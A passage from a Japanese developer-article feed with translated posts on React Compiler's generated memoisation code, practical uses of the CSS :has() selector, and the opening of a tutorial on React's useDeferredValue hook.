<p>ただし、React Compilerのキャッシュは開発者が一般的にメモ化で行うキャッシュよりも詳細であり、しかも自動的にこれを行っています。つまり、開発者は手動で依存関係やメモ化を管理する必要がないのです。コードさえ書けば、React Compilerがそれをもとに新しいコードを生成し、キャッシュを利用することで高速化も実現してくれます。</p>
<p>React CompilerがまだJSXを生成していることも言っておくべきでしょう。実際に実行されるコードは、JSXのトランスパイルを行った上でReact Compilerが生成したものです。</p>
<p>JavaScriptエンジンで実際に実行される（ブラウザに送られるか、サーバー上で実行される）<code class="language-text">List</code>関数は、次のようなものです。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter">t0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> $ <span class="token operator">=</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span>
    items
  <span class="token punctuation">}</span> <span class="token operator">=</span> t0<span class="token punctuation">;</span>
  <span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> t1<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> t1<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t1 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">useReducer</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> t1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> t2<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> items<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> t3<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function-variable function">t3</span> <span class="token operator">=</span> <span class="token parameter">item</span> <span class="token operator">=></span> <span class="token function">_jsx</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">children</span><span class="token operator">:</span> item
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    t2 <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>t3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> items<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> t2<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t2 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">const</span> listItems <span class="token operator">=</span> t2<span class="token punctuation">;</span>
  <span class="token keyword">let</span> t3<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!==</span> listItems<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> <span class="token function">_jsx</span><span class="token punctuation">(</span><span class="token string">"ul"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">children</span><span class="token operator">:</span> listItems
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> listItems<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> t3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>React Compilerは、値をキャッシュするための配列と、そのために必要なすべてのif文を追加しました。JSXトランスパイラはJSXをネストされた関数に変換しました。あなたが書いたコードとJavaScriptエンジンが実行するコードの間には大きな違いがあります。つまり、他人が書いたコードが、自分が当初意図したとおりのものを生成してくれることを信用する必要があります。</p>
<h2>CPUの命令サイクルとデバイスメモリのトレードオフ</h2>
<p>メモ化とキャッシュは、大まかに言うとメモリを犠牲にしてCPUへの負荷を軽減することを意味します。CPUがパフォーマンスコストの高い演算を行わなくて済む代わりに、メモリ容量を消費してデータを保存しているのです。</p>
<p>React Compilerを使用するということは、デバイスのメモリ上にできるだけデータを保存するということです。ユーザーデバイスのブラウザ上でコードを実行する場合、この点はアーキテクチャの面で意識する必要があります。</p>
<p>多くのReactアプリでは大きな問題にならないでしょう。しかし、アプリ上で大量のデータを扱う場合、実験ステージを経たReact Compilerを使うのであれば、少なくともデバイスメモリが使用されることを意識し、メモリの使用状況を注視する必要があるでしょう。</p>
<h2>抽象化とデバッグ</h2>
<p>形式を問わず、コンパイルはすべて自分が書いたコードと実際に実行されるコードの間の抽象化レイヤーに相当します。</p>
<p>この記事で説明したように、React Compilerの場合、実際にブラウザに送られるコードの内容を理解するためには、自分のコードをReact Compilerにかけて、生成されたコードをJSXトランスパイラにかけてみる必要があります。</p>
<p>コードに抽象化レイヤーを加えることにはデメリットもあります。デバッグが難しくなる場合があるのです。だからと言って使用を避けた方がいいというわけではありませんが、デバッグ対象のコードは自分が書いたものだけではなく、ツールが生成したものだということは頭に入れておく必要があります。</p>
<p>抽象化レイヤーから生成されたコードをデバッグする上では、抽象化について正確なメンタルモデルを持っておくことが成果を大きく左右します。React Compilerの仕組みを完全に理解することで、生成されたコードをデバッグできるようになり、ストレスなく開発作業を行えるようになるでしょう。</p>
<h2>さらに深く掘り下げる</h2>
<p>このブログ記事が有益だと感じていただけたなら、筆者が提供している<a href="https://understandingreact.com/">Understanding React</a>というコースもぜひご検討ください。計16.5時間にわたり、Reactのあらゆる機能について同様に深く掘り下げています。生涯にわたるアクセス権とすべてのソースコード、修了証が得られます。</p>
<p>筆者はReactのソースコードも、React Compilerのソースコードも、すべて読みました。なぜかと言うと、Reactの仕組みを内部実装レベルから説明できるようにするためです。</p>
<p>React自体は、Webを基礎とし、その上に構築された大きな抽象化レイヤーです。抽象化ではよくあることですが、Reactを使用する開発者のほとんどは、その仕組みについて正確なメンタルモデルを持っていません。それが、Reactベースのアプリケーションをビルドし、デバッグする上で大きな影響を及ぼしています。しかし、Reactについて深く理解することは可能です。</p>
<p>React 19の機能とReact Compilerに関する新しい内容を近々コースに追加する予定です。すでに受講されている方は無料でご利用いただけます。<a href="https://understandingreact.com/">コースの方もぜひチェックしてみてください</a>。最初の6時間分の内容は、筆者のYouTubeチャンネルで無料公開しています。以下がその動画です。</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/-XKvVyC6si0" title="Understanding React: The First 6 Hours" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
<p>単に誰かが書いたコードをまねするだけではなく、自分の仕事を本当の意味で理解する旅に、一緒に出かけてみませんか？
-- トニー</p>]]></content:encoded></item><item><title><![CDATA[まだまだある実例に沿った:has()の使い方]]></title><description><![CDATA[:has()疑似クラスは筆者が断トツで一番気に入っているCSSの新機能です。筆者と同じ意見の読者も多いでしょう。少なくとも、State of CSSのアンケートに回答した方の中には多くいるはずです。…]]></description><link>https://postd.cc/more-real-world-uses-for-has/</link><guid isPermaLink="false">https://postd.cc/more-real-world-uses-for-has/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[CSS]]></category><pubDate>Fri, 30 Aug 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p><a href="https://css-tricks.com/almanac/selectors/h/has/">:has()疑似クラス</a>は筆者が断トツで一番気に入っているCSSの新機能です。筆者と同じ意見の読者も多いでしょう。少なくとも、<a href="https://2022.stateofcss.com/en-US/features/selectors/#has_selector">State of CSSのアンケートに回答した方の中には多くいるはずです</a>。セレクタを逆向きに指定できることで、これまでできると思いもしなかったようなすごいことがもっと可能になります。</p>
<p>「もっと」と言うのは、すでに多くの人が極めてスマートなアイデアを色々と発表しているからです。以下に一部紹介します。</p>
<ul>
<li><a href="https://webkit.org/blog/13096/css-has-pseudo-class/">Using :has() as a CSS Parent Selector and much more</a>（Jen Simmons）</li>
<li><a href="https://www.bram.us/2022/12/13/quantity-queries-for-islands-of-elements-with-the-same-class-thanks-to-css-has/">Quantity Queries for “islands of elements” with the same class, thanks to CSS :has()</a>（Bramus）</li>
<li><a href="https://www.bram.us/2022/11/17/style-a-parent-element-based-on-its-number-of-children-using-css-has/">Style a parent element based on its number of children（Bramus）
Using combinators in :has()</a>（Manuel Matuzović）</li>
<li><a href="https://www.bram.us/2022/11/17/style-a-parent-element-based-on-its-number-of-children-using-css-has/">4 ways CSS :has() can make your HTML forms even better</a>（Austin Gil）</li>
<li><a href="https://www.youtube.com/watch?v=ljD_ENTYuB8&#x26;t=233s">Video: Practical Use Cases for :has() Pseudo-Class</a>（Zoran Jambor）
<a href="https://developer.chrome.com/blog/has-m105/">:has(): the family selector</a>（Jhey Tompkins）</li>
</ul>
<p>この記事は、:has()の使い方に関する包括的なガイドではありません。すでに誰かが語ったことを繰り返しているわけでもありません。ちょっとだけ流行に乗って(hi👋)筆者が考えている:has()の使い方を紹介できればと思い、この記事を書いています。ただし、実際に使うのはブラウザ側の対応がもう少し進んでからですが。（Firefoxだけが未対応ですが、もうすぐ対応すると思います。）（※訳註　2024年8月現在は対応済）</p>
<p>その日が来れば、間違いなく:has()を使いまくるでしょう。筆者が最近ビルドした実例から、:has()の恩恵を特に受けそうなものをいくつか紹介します。</p>
<h2>JavaScriptコンポーネントの外部要素と連携しなくて済む</h2>
<p>ページの他の部分のスタイルを変える必要のあるインタラクティブコンポーネントを作成したことはありますか？　次の例をご覧ください。ここで、<code class="language-text">&lt;nav></code>は<a href="https://css-tricks.com/i-saw-two-mega-menus-today/">メガメニュー</a>を表し、開くとその上の<code class="language-text">&lt;header></code>コンテンツの色が変わります。</p>
<p>筆者の仕事ではこうした処理がしょっちゅう必要になります。</p>
<p>これは、筆者があるサイトで使用するために作ったReactコンポーネントです。この例では、document.querySelector(...)を使用してページのReact以外の部分と連携し、<code class="language-text">&lt;body></code>、<code class="language-text">&lt;header></code>または別のコンポーネントのクラスを切り替える必要がありました。この世の終わりというほどのことではありませんが、面倒であることに違いありません。全部Reactで記述したサイト（Next.jsサイトなど）であっても、menuIsOpenのstateをコンポーネントツリーのずっと上の方で管理するか、あまりReact的ではありませんが、先程挙げた例と同じように、DOM要素の取得とクラスの切り替えを行う必要があります。</p>
<p>この問題は、:has()を使うことで解決します。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">header:has(.megamenu--open)</span> <span class="token punctuation">{</span>
  <span class="token comment">/* style the header differently if it contains 
    an element with the class ".megamenu--open"
  */</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>JavaScriptコンポーネントの他のDOM要素をいじる必要はもうありません！</p>
<h2>ストライプテーブル作成UXの向上</h2>
<p>1行おきに背景色を追加した「ストライプテーブル」は、UXの向上に役立ちます。行を目で追いやすくなるため、表が見やすくなります。
しかし、筆者の経験では2、3行しかない表ではあまりうまく行きません。例えば、<code class="language-text">&lt;tbody></code>が3行の表で「偶数」行に背景色を付けた場合、色付きの行は1行だけになります。そうするとあまり意味はなく、ハイライトされた1行に何か特別な意味があるのではないかと逆にユーザーを困惑させてしまうことになり兼ねません。</p>
<p><a href="https://www.bram.us/2022/11/17/style-a-parent-element-based-on-its-number-of-children-using-css-has/">Bramus氏が:has()を使用して子の数に応じてスタイルを使い分ける</a>方法を説明していますが、このテクニックを使用することで、4行以上ある表にストライプスタイルを適用することができます。</p>
<p class="codepen" data-height="300" data-default-tab="html,result" data-slug-hash="dyjyqmR" data-pen-title="Conditional table striping with :has()" data-user="liamj" style="height: 300px; box-sizing: border-box; display: flex; align-items: center; justify-content: center; border: 2px solid; margin: 1em 0; padding: 1em;">
  <span>See the Pen <a href="https://codepen.io/liamj/pen/dyjyqmR">
  Conditional table striping with :has()</a> by Liam (<a href="https://codepen.io/liamj">@liamj</a>)
  on <a href="https://codepen.io">CodePen</a>.</span>
</p>
<script async src="https://cpwebassets.codepen.io/assets/embed/ei.js"></script>
<p>もっと手の込んだことがしたければ、列の数が一定数以上の場合のみストライプスタイルを適用することもできます。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">table:has(:is(td, th):nth-child(3))</span> <span class="token punctuation">{</span>
  <span class="token comment">/* only do stuff if there are three or more columns */</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<h2>テンプレートから条件ロジックを含むクラスを取り除く</h2>
<p>ページの内容に応じてレイアウトを変えなくてはならないことがよくあります。以下のグリッドレイアウトをご覧ください。サイドバーの有無に応じて、メインコンテンツが配置されるグリッド領域が変わっています。</p>
<p><img src="https://i0.wp.com/css-tricks.com/wp-content/uploads/2022/12/s_3C0A8FC3F034E5EE17FAF2704E4BF0FB7F3CBE50853FB2A8A6B7B502A838DC20_1671494338550_ScreenShot2022-12-19at11.23.58AM.png?resize=1024%2C861&#x26;ssl=1"></p>
<p>これは、CMSに兄弟ページが設定されているかどうかで変わる可能性があります。筆者は通常、両方のレイアウトに対応するため、テンプレートロジックを使用してレイアウトのラッパーに<a href="https://css-tricks.com/taming-the-cascade-with-bem-and-modern-css-selectors/">BEM修飾子クラス</a>を条件付きで追加しています。その場合、CSSは次のようになります（簡略化のため、レスポンシブルールなどは省いています）。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token comment">/* m = main content */</span>
<span class="token comment">/* s = sidebar */</span>
<span class="token selector">.standard-page--with-sidebar</span> <span class="token punctuation">{</span>
  <span class="token property">grid-template-areas</span><span class="token punctuation">:</span> <span class="token string">'s s s m m m m m m m m m'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">.standard-page--without-sidebar</span> <span class="token punctuation">{</span>
  <span class="token property">grid-template-areas</span><span class="token punctuation">:</span> <span class="token string">'. m m m m m m m m m . .'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>CSS的には、もちろんこれでも全く問題ありません。しかし、若干ごちゃごちゃしたテンプレートコードにはなってしまいます。テンプレートに使用する言語によっては、多くのクラスを条件付きで追加すると、かなり乱雑な見た目になってしまう場合があります。多くの子要素も使用しなければならない場合は特にそうです。</p>
<p>では、:has()を使ったやり方と比べてみてください。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token comment">/* m = main content */</span>
<span class="token comment">/* s = sidebar */</span>
<span class="token selector">.standard-page:has(.sidebar)</span> <span class="token punctuation">{</span>
  <span class="token property">grid-template-areas</span><span class="token punctuation">:</span> <span class="token string">'s s s m m m m m m m m m'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">.standard-page:not(:has(.sidebar))</span> <span class="token punctuation">{</span>
  <span class="token property">grid-template-areas</span><span class="token punctuation">:</span> <span class="token string">'. m m m m m m m m m . .'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>正直なところ、CSS的にはそれほど大きな改善ではありません。しかし、HTMLテンプレートからモディファイアー部分のクラス名を省けるのはプラスだと思います。</p>
<p>:has()を使ったデザインの小技は簡単に思い浮かびます（<a href="https://css-tricks.com/creating-animated-clickable-cards-with-the-has-relational-pseudo-class/">例えば画像入りのカードなど</a>）が、こうしたレイアウトの大きな変更にもかなり威力を発揮すると思います。</p>
<h2>詳細度を管理しやすい</h2>
<p><a href="https://css-tricks.com/taming-the-cascade-with-bem-and-modern-css-selectors/">前回の記事</a>を読んだ方であれば、筆者が詳細度にうるさいことはご存じかと思います。筆者のように、スタイル全体に:has()や:not()を追加することで詳細度が上がりすぎるのを避けたい場合は、:where()を使用するようにしましょう。</p>
<p>これは、:has()の詳細度は引数リストの中で最も詳細度の高い要素に基づくためです。したがって、IDのようなものが含まれていれば（なぜかは分かりませんが）、カスケード上でセレクタがオーバーライドされにくくなります。</p>
<p>一方、<a href="https://css-tricks.com/almanac/selectors/w/where/">:where()の詳細度は常にゼロ</a>なので、詳細度が上がることはありません。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token comment">/* specificity score: 0,1,0.
  Same as a .standard-page--with-sidebar 
  modifier class
*/</span>
<span class="token selector">.standard-page:where(:has(.sidebar))</span> <span class="token punctuation">{</span>
  <span class="token comment">/* etc */</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>未来は明るい</h2>
<p>これらはほんの一部ですが、本番環境で使えるようになるのが待ち遠しいです。（※訳註　2024年8月現在は対応済）
<a href="https://css-tricks.com/almanac/selectors/h/has/#aa-use-cases">CSS-Tricks Almanacでも多くの実例が紹介されています</a>。皆さんは:has()を使ってどんなことがしたいですか？　あなたが実際に直面したシチュエーションで、:has()が完璧な解決策になりそうなものはこれまでにありましたか？</p>]]></content:encoded></item><item><title><![CDATA[useDeferredValueを使用してUIを素早く最適化する]]></title><description><![CDATA[登場以来、Reactはアプリケーションのパフォーマンスを最適化するためのツールを多数供してきました。中には極めて有益でありながら、あまり知られていないものもあります。はその一つです。このツールは、特…]]></description><link>https://postd.cc/use-deferred-value/</link><guid isPermaLink="false">https://postd.cc/use-deferred-value/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[React]]></category><pubDate>Mon, 22 Jul 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>登場以来、Reactはアプリケーションのパフォーマンスを最適化するためのツールを多数供してきました。中には極めて有益でありながら、あまり知られていないものもあります。<code class="language-text">useDeferredValue</code>はその一つです。このツールは、特定の状況においてユーザーエクスペリエンスを大きく左右することができます。⚡</p>
<p>筆者は最近このフックを使用し、このブログの厄介なパフォーマンス問題を解決したのですが、そのあまりの効果に衝撃を受けました。低性能デバイスでは反則級の改善が見られ、まるで黒魔術のようでした。</p>
<p><code class="language-text">useDeferredValue</code>には若干気後れさせるような評判があり、実際かなり洗練されたツールではあるのですが、正しいメンタルモデルで向き合えば恐るるに足りません。このチュートリアルでは、その仕組みと、アプリケーションのパフォーマンスを劇的に改善させる使い方を詳しく説明します。</p>
<h2>問題</h2>
<p>数年前、筆者は本物のような影を生成する<a href="https://www.joshwcomeau.com/shadow-palette/">Shadow Palette Generator</a>というツールをリリースしました。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="https://www.joshwcomeau.com/videos/use-deferred-value/shadow-palette-initial.mp4"></video></p>
<p>スライダーなどのUIコントロールを動かしてみることで、自分だけの影をデザインすることができます。CSSコードを自分のアプリケーションにコピペすることも可能です。</p>
<p><strong>問題は次の点です</strong>。このUI上のコントロールは、「即座に」結果が反映されるよう設計されています。例えば、ユーザーが「Oomph」スライダーを動かすと、その効果がすぐに見られます。つまり、スライダーを動かす間、UIが「1秒間に数十回再レンダリングされる」ということです。</p>
<p>Reactは高速ですし、このUIの大部分は容易にアップデート可能です。問題は、<strong><em>シンタックスハイライトされた下部のコードスニペット</em></strong>です。</p>
<p><img src="https://www.joshwcomeau.com/_next/image/?url=%2Fimages%2Fuse-deferred-value%2Fcss-snippet.png&#x26;w=640&#x26;q=75"></p>
<p>シンタックスハイライトの処理は驚くほど複雑です。まず、rawコードを「トークン化」する必要があります。この工程では、コードをいくつかに分けてラベルを付けます。各トークンには異なる色を付けられるため、それぞれ<code class="language-text">&lt;span></code>タグでラップする必要があります。</p>
<p>このスニペットの中の1行に対して必要なマークアップの量は以下の通りです。</p>
<p><img src="https://www.joshwcomeau.com/images/use-deferred-value/single-line-of-code.png"></p>
<p>最適化していない状態だと、Reactはこれだけのマークアップを
<strong><em>1秒間に何十回も</em></strong>再計算する必要があります。ほとんどのデバイスでは、ブラウザの処理が追いつかず、画面がカクカクします。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="https://www.joshwcomeau.com/videos/use-deferred-value/shadow-palette-janky.mp4"></video></p>
<p><code class="language-text">change</code>イベントは1秒間に最大60回発生しますが、UIが1秒間に処理できる更新の数はわずかです。UIの質が低く、反応が悪いと感じるのはそのためです。</p>
<p><strong>これは興味深い問題です</strong>。このUIで最も重要な部分は、影の外観を示した左側の図です。この部分は、ユーザーが設定変更の影響を把握できるよう、変更が行われたら直ちに更新することが望まれます。また、コントロール自体も反応良くスムーズに動かないといけません。</p>
<p>一方、コードスニペットは1秒間に何十回も更新する必要はありません。ユーザーにとって重要なのは、自分のアプリケーションにコピーする最終的なコードだけです。変更を加えるたびに再計算を行うと、ユーザーエクスペリエンス全体が損なわれてしまいます。
言い換えると、このUIには優先度の高い領域（High Priority）と低い領域（Low Priority）があるということです。</p>
<p><img src="https://www.joshwcomeau.com/images/use-deferred-value/high-vs-low-priority.png"></p>
<p>優先度の高い領域はリアルタイムに、できるだけ迅速に更新し、優先度の低い領域は後回しにします。</p>
<h2>不完全なソリューション</h2>
<p>この問題を解決するために、私は当初「スロットリング」という手法を用いました。具体的に言うと、このコンポーネントに対して200ミリ秒ごとにしか再レンダリングできないように制限をかけたのです。
その結果がこちらです。</p>
<p><video controls src="https://www.joshwcomeau.com/videos/use-deferred-value/shadow-palette-initial.mp4" title="ttps://www.joshwcomeau.com/videos/use-deferred-value/shadow-palette-janky.mp4"></video></p>
<p>UIの他の部分に比べてコードスニペットの更新頻度が低いことに気づいたでしょうか。UIの他の部分は必要に応じて何度でも再レンダリングできますが、この部分は200ミリ秒に1回、つまり1秒間に5回しか更新されません。</p>
<p><em>この方法でも問題は改善します</em>が、完全なソリューションと言うには程遠い結果です。</p>
<p>まだ少し遅く、低品質に感じます。UIの一部を意図的に遅くしていることはユーザーには分からないので。</p>
<p>もっと重要な点は、超高性能な最新のコンピューターや低価格の古いAndroidスマホなど、人によって使用するデバイスはさまざまだということです。ユーザーのデバイスが十分高速なら、スロットリングは不要であり、意味もなく処理速度を下げているだけです。一方、デバイスが本当に遅ければ、200ミリ秒でさえ十分ではない可能性があり、そうするとUIの重要な部分がスムーズに表示されません。</p>
<p>こうした問題の解決に有効なのが、useDeferredValueです。</p>
<h2>useDeferredValueの紹介</h2>
<p><code class="language-text">useDeferredValue</code>は、UIを優先度の高い領域と低い領域に切り分けられるReactフックです。何か重要なことが起きると、Reactが処理を中断できるようにします。</p>
<p><strong>仕組みを理解するために、簡単な例から見ていきましょう</strong>。次のコードをご覧ください。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ImportantStuff</span></span> <span class="token attr-name">count</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>count<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">SlowStuff</span></span> <span class="token attr-name">count</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>count<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        Increment
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ここでのstateは<code class="language-text">count</code>です。これは、ボタンをクリックするごとに増えていく数字です。<code class="language-text">ImportantStuff</code>はUIの中で優先度の高い部分を表します。つまり、<code class="language-text">count</code>が増えるたびに直ちに更新したい部分です。<code class="language-text">SlowStuff</code>は、UIの中で重要性が低い部分を表します。</p>
<p>ユーザーがボタンをクリックして<code class="language-text">count</code>が増えるたびに、ReactはUIを更新する前にこれらの子コンポーネントを両方とも再レンダリングする必要があります。</p>
<p><strong>詳しく分析してみましょう</strong>。下のボタンをクリックして、実際にレンダリングが行われる様子をご覧ください。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="/static.mov"></video>
（訳注：<a href="https://www.joshwcomeau.com/react/use-deferred-value/">イメージはキャプチャーです。インタラクティブサンプルは翻訳元サイトで確認できます</a>）</p>
<p>このデモのUIは、録画されたインタラクションの動画です。<strong>タイムラインのスライダーを動かすと、その時点のUIの状態を確認することができます</strong>。ボタンをクリックするとレンダリングが始まりますが、レンダリングが完了するまでUIが更新されない点に注目してください。</p>
<p><code class="language-text">ImportantStuff</code>と<code class="language-text">SlowStuff</code>の両方のレンダリングが、Reactが行う必要のある処理の全体です。<strong>次のスナップショットをクリックまたはタップして、中をのぞいてみてください</strong>。</p>
